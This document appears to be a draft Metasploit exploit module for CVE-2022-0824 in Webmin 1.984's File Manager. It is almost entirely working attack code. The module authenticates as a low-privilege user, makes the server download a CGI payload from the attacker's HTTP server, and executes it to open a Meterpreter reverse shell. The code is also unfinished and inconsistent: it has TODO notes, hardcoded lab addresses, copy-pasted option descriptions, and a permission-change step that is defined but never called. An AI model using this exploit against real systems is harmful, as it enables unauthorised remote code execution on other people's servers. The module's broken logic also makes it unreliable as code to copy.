##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Webmin File Manager RCE',
        'Description' => %q{
          In Webmin version 1.984, affecting File Manager module, any authenticated low privilege user without access rights to
          the File Manager module could interact with file manager functionalities such as download file from remote URL and
          change file permission. It is possible to achieve Remote Code Execution via a crafted .cgi file by chaining those
          functionalities in the file manager.
        },
        'Author' => [
          'test', # discovery
          'jheysel-r7' # module
        ],
        'References' => [
          [ 'URL', 'https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell'], # exploit
          [ 'CVE', '2022-0824']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Privileged' => false,
        'DefaultOptions' => {
          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
        },
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2022-03-06' # double check
      )
    )

    # TODO: change default values
    register_options(
      [
        OptRhosts.new('RHOSTS', [true, 'The default webmin port', '172.16.199.132']),
        OptString.new('LHOST', [true, 'The default webmin port', '172.16.199.1']),
        OptPort.new('RPORT', [true, 'The default webmin port', 10000]),
        OptString.new('USERNAME', [ true, 'The username to authenticate as', 'msfuser' ]),
        OptString.new('PASSWORD', [ true, 'The password for the specified username', 'notpassword' ])

      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    )

    return CheckCode::Unknown("#{peer} - Could not connect to web service - no response") unless res

    if res.body.include?('This web server is running in SSL mode.')
      return CheckCode::Unknown("#{peer} - Please enable the SSL option to proceed")
    end

    version = res.headers['Server'].to_s.scan(%r{MiniServ/([\d.]+)}).flatten.first

    return CheckCode::Unknown("#{peer} - Webmin version not detected") unless version

    version = Rex::Version.new(version)

    vprint_status("Webmin #{version} detected")

    unless version <= Rex::Version.new('1.984')
      return CheckCode::Safe("#{peer} - Webmin #{version} is not a supported target")
    end

    vprint_good("Webmin #{version} is a supported target")

    CheckCode::Appears
  rescue ::Rex::ConnectionError
    return CheckCode::Unknown("#{peer} - Could not connect to web service")
  end

  def login
    print_status('Attempting to authenticate with Webmin')
    res = send_request_cgi({
                             'method' => 'POST',
                             'uri' => normalize_uri(datastore['TARGETURI'], 'session_login.cgi'),
                             'cookie' => 'testing=1', # it must be used for "Error - No cookies"
                             'keep_cookies' => true,
                             'vars_post' => {
                               'page' => '',
                               'user' => datastore['USERNAME'],
                               'pass' => datastore['PASSWORD']
                             }
                           })

    if res && res.code == 302 && res.get_cookies =~ /sid=(\w+)/
      print_good("Authentication successful")
      return ::Regexp.last_match(1)
    end

    return nil unless res

    ''
  end

  def download_remote_url
    print_status('Fetching payload from HTTP server')
    test = ('http://' + datastore['SRVHOST'] + ':' +  '8081' + '/' + 'revshell.cgi')

    # Changed to raw due to issues with encoding in data field
    res = send_request_raw({
                             'uri' => normalize_uri(datastore['TARGETURI'], '/extensions/file-manager/http_download.cgi?module=filemin'),
                             'method' => 'POST',
                             'cookie' => "sid=#{@cookie}",
                             # 'data' => 'link=http%3a%2F%2F172.16.199.1%3a8081%2Frevshell.cgi&username=&password=&path=%2Fusr%2Fshare%2Fwebmin',
                             'data' => 'link=' + 'http://' + datastore['SRVHOST'] + ':' +  datastore['SRVPORT'].to_s + '/' + 'revshell.cgi&username=&password=&path=%2Fusr%2Fshare%2Fwebmin',
                             'headers' => {
                               'Accept' => 'application/json, text/javascript, */*; q=0.01',
                               'Accept-Encoding' => 'gzip, deflate',
                               'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
                               'X-Requested-With' => 'XMLHttpRequest',
                               'Referer' => 'http://' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + '/filemin/?xnavigation=1'
                             }
                           })

    if res.body.include?("Error: No valid URL supplied!")  # Failed to connect to
      fail_with(Failure::UnexpectedReply,"please properly configure the http server, it could not be found by webmin")
    end
    fail_with(Failure::UnexpectedReply, 'Unable to download .cgi payload from http server') unless res
  end

  def modify_permissions
    print_status('Modifying the permissions of the uploaded payload to 0755')
    res = send_request_cgi({
                             'uri' => normalize_uri(datastore['TARGETURI'], '/extensions/file-manager/chmod.cgi?module=filemin&page=1&paginate=30'),
                             'method' => 'POST',
                             'keep_cookies' => true,
                             'headers' => {
                               'Referer' => datastore['TARGETURI'] + '/filemin/?xnavigation=1'
                             },
                             'vars_post' => {
                               'name' => 'revshell.cgi',
                               'perms' => '0755',
                               'applyto' => '1',
                               'path' => '/usr/share/webmin'
                             }
                           })
    fail_with(Failure::UnexpectedReply, 'Unable to modify permissions on the upload .cgi payload') unless res
  end

  def exec_revshell
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], 'revshell.cgi'),
      'headers' => {
        'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8'
      }
    )

    fail_with(Failure::UnexpectedReply, 'Unable to execute the .cgi payload') unless res && res.code == 200
  end

  def on_request_uri(cli, request)
    print_status("Request '#{request.method} #{request.uri}'")
    print_status 'Sending payload ...'
    send_response(cli, payload,
                  'Content-Type' => 'application/octet-stream')
  end

  def exploit
    # generate_payload think metasploit handles this automagically
    @cookie = login
    fail_with(Failure::BadConfig, 'Unsucessful login attempt with creds') if @cookie.empty?
    print_status('Downloading remote url')
    download_remote_url
    print_status('Finished downloading remote url')
    exec_revshell
  end

end
